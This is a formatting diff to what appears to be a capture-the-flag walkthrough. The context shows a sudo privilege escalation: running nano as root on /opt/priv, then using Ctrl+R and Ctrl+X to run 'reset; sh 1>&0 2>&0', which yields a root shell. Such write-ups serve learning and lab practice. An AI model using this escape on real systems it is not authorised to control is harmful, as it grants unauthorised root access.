@@ -131,7 +131,10 @@ Open the file /opt/priv with root privileges as stated in sudoers file
 sudo /bin/nano /opt/priv 
 ```
 Now ***Ctrl+R*** then ***Ctrl+X***
-We will get tab at bottom to write command to execute. Type 
+
+We will get tab at bottom to write command to execute.
+
+Type 
 ***reset; sh 1>&0 2>&0*** 
 
 Got the root shell and the root.txt.
